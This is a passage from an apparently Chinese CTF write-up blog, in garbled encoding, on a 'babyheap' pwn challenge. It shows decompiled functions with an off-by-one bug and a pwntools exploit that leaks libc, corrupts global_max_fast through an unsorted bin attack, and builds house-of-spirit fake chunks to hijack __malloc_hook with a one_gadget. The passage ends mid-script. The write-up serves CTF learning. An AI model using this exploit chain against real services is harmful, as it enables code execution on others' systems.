punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>        <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>        <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>        <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>        <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid option!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">puts</span><span class="token punctuation">(</span>byte_1168<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>mainå‡½æ•°å¼€å¤´æœ‰ä¸€ä¸ªsub_EC6()å‡½æ•°</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_EC6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">mallopt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"WELCOME!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>å…¶ä¸­çš„mallopt(1,0)è§„å®šäº†global_max_fastçš„å¤§å°ä¸º0ï¼Œè¿™æ ·å³æ˜¯é™åˆ¶äº†fastbinçš„æœ€å¤§å¤§å°ä¸º0ï¼Œå³ä¸å…è®¸ä½¿ç”¨fastbin<br>å†çœ‹åˆ°addå‡½æ•°</p><pre class=" language-c"><code class="language-c">v2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0xF</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> i<span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Don't have enough space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">0x6F</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The size is wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_A8A</span><span class="token punctuation">(</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æœ€å¤§å…è®¸add chunk16æ¬¡ï¼Œå¹¶ä¸”å…è®¸ç”³è¯·çš„æœ€å¤§çš„chunkå¤§å°ä¸º0x6f</p><p>deleteå‡½æ•°</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v1 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v1 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid index!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>deleteå‡½æ•°æ²¡æœ‰é—®é¢˜ï¼Œfreeä¹‹ååŒæ—¶å°†æŒ‡é’ˆæ¸…é›¶</p><p>editå‡½æ•°</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v2 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid index!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v0 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sub_A8A</span><span class="token punctuation">(</span>qword_202060<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å…¶ä¸­çš„sub_A8Aå­˜åœ¨off-by-oneæ¼æ´<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/3.jpg" alt=""></p><p>showå‡½æ•°</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v1 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v1 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token operator">||</span> <span class="token operator">!</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid index!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œé€šè¿‡åºå·è¾“å‡ºchunkçš„å†…å®¹</p><p>æ•´ç†ä¸€ä¸‹æˆ‘ä»¬çš„ä¿¡æ¯<br>1.æ— æ³•ä½¿ç”¨fastbin attack<br>2.æœ€å¤§åªå…è®¸åˆ†é…0x6få¤§å°çš„chunk<br>3.å­˜åœ¨off-by-oneæ¼æ´<br>å¤§æ¦‚æ€è·¯å¦‚ä¸‹:é€šè¿‡unsorted bin attackä¿®æ”¹global_max_fastçš„å¤§å°ï¼Œæ˜¯fastbinå¼€å¯ï¼Œç„¶åé€šè¿‡fastbin attackä¿®æ”¹malloc_hookä¸ºone_gadget</p><p>å…ˆå°è£…å¥½æˆ‘ä»¬è¦ç”¨åˆ°çš„ä¸€äº›å‡½æ•°</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>é¦–å…ˆè®©æˆ‘ä»¬æ¥æ³„éœ²libcåŸºåœ°å€<br>æˆ‘ä»¬åˆ›å»º5ä¸ªchunkï¼Œç¬¬ä¸€ä¸ªç”¨æ¥off-by-oneï¼Œç¬¬äºŒä¸‰å››ä¸ªç”¨æ¥åˆå¹¶ï¼Œç¬¬äº”ä¸ªé˜²æ­¢å‰é¢çš„chunkå’Œtopchunkåˆå¹¶<br>æˆ‘ä»¬å°†chunk1(ç¼–å·ä»0å¼€å§‹)çš„sizeä¿®æ”¹ä¸ºchunk123çš„å’Œï¼Œç„¶åfreeæ‰ï¼Œå†addä¸€ä¸ªchunk1å¤§å°çš„chunkï¼Œè¿™æ ·main_arenaçš„åœ°å€å°±åˆ°äº†chunk2é‡Œé¢ï¼Œç„¶åshow(2)å³å¯leakå‡ºåœ°å€</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3c67f8</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"global_max_fast => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>global_max_fast<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>one_gadget_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>one_gadgetlog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__malloc_hook_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__libc_realloc_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æœ‰äº†libcåŸºåœ°å€ä¹‹åï¼Œæˆ‘ä»¬å°±è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œä¿®æ”¹global_max_fast<br>æˆ‘ä»¬éœ€è¦å°†æŸä¸ªfreeæ‰çš„chunkçš„bkæŒ‡é’ˆä¿®æ”¹ä¸ºglobal_max_fast-0x10å¤„ï¼Œè¿™å°±éœ€è¦æ„é€ fake chunkï¼Œå³house of spritæŠ€æœ¯(ç›´æ¥é€šè¿‡overlapè¡Œä¸é€šï¼Œå› ä¸ºè¿™é¢˜editçš„é•¿åº¦æ˜¯åŸchunkè¾“å…¥å†…å®¹çš„é•¿åº¦ï¼Œè€Œè¾“å…¥å†…å®¹çš„é•¿åº¦æ˜¯é€šè¿‡strlenå‡½æ•°åˆ¤æ–­çš„ï¼Œé‡åˆ°â€™\x00â€™å°±ä¼šæˆªè‡³)<br>æˆ‘ä»¬å…ˆå°†chunkæ¢å¤åŸçŠ¶</p><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">'''add(0x18, 'a'*0x18)add(0x28, 'a')add(0x38, 'a')add(0x28, 'a')add(0x18, 'a'*0x18)edit(0, 'a'*0x18+p8(0xa1))free(1)add(0x28, 'a')show(2)'''</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ç„¶åè¿›è¡Œå¦‚ä¸‹æ“ä½œ</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>è‡³äºä¸ºä»€ä¹ˆè¿™ä¹ˆæ“ä½œï¼Œæˆ‘ä»¬è¿›å…¥gdbçœ‹çœ‹<br>é¦–å…ˆæ˜¯free(1)ä¹‹å<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/5.jpg" alt=""><br>æ¥ç€æ„é€ æˆ‘ä»¬çš„fakechunk<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/6.jpg" alt=""><br>æ¥ç€å°†unsorted binä¸­å‰©ä¸‹çš„0x50å¤§å°çš„chunkä¹Ÿåˆ†é…å‡ºæ¥ï¼Œç„¶åä¾æ¬¡freeæ‰æˆ‘ä»¬åˆšåˆšaddçš„chunk</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#è¿™é‡Œå®é™…ä¸Šfreeçš„æ˜¯æˆ‘ä»¬çš„fakechunk</span></code></pre><p>æˆ‘ä»¬å†è¿›åˆ°gdbçœ‹çœ‹<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/8.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„fakechunkç¡®å®è¢«æ”¾å…¥äº†unsortedbinä¸­ï¼Œå¹¶ä¸”ç”±äºfakechunkçš„fdå’ŒbkæŒ‡é’ˆéƒ½åŒ…å«åœ¨chunk1ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯é‡æ–°åˆ†é…chunk1ï¼Œç„¶åå°†fakechunkçš„bkæŒ‡é’ˆä¿®æ”¹</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/9.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°global_max_fastçš„å€¼å˜æˆäº†main_arenaçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨fastbinäº†<br>æœ€åçš„fastbin attackä¹Ÿåˆ©ç”¨äº†house of spritæŠ€æœ¯ï¼Œå°±ä¸å¤šèµ˜è¿°äº†ï¼Œä¸‹é¢æ˜¯å®Œæ•´exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io=remote('nc.eonew.cn',10502)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babyheap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> <span class="token number">0x4526a</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token 